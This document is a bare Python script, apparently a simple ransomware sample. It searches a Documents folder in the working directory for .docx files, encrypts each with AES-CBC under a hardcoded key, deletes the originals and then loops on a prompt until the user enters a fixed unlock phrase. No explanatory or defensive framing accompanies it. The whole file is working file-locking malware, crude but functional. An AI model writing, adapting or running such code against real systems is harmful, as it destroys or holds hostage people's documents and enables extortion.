from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import os

key = b"RhinoiIirhinoiIi"

def encrypt(data):
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_data = cipher.encrypt(pad(data, AES.block_size))
    return iv + encrypted_data

def decrypt(data):
    iv = data[:16]
    encrypted_data = data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = cipher.decrypt(encrypted_data)
    return unpad(decrypted_data, AES.block_size)

def encrypt_file(path):
    with open(str(path), "rb") as f:
        data = f.read()
    encrypted_data = encrypt(data)
    with open(str(path) + ".encrypted", "wb") as f:
        f.write(encrypted_data)
    os.remove(str(path))

def decrypt_file(path):
    with open(str(path) + ".encrypted", "rb") as f:
        data = f.read()
    decrypted_data = decrypt(data)
    with open(str(path), "wb") as f:
        f.write(decrypted_data)
    os.remove(str(path) + ".encrypted")

def get_files(directory, ext):
    return list(Path(directory).rglob(f"*{ext}"))

directory = os.path.join(os.getcwd(), "Documents")
ext = ".docx"
paths = get_files(directory, ext)

if paths:
    for file_path in paths:
        encrypt_file(file_path)
    print(f"Encrypted {len(paths)} files.")

while True:
    code = input("Enter decryption code: ").strip()
    if code == "Decrypt files":
        for file_path in paths:
            decrypt_file(file_path)
        print(f"Decrypted {len(paths)} files.")
        break
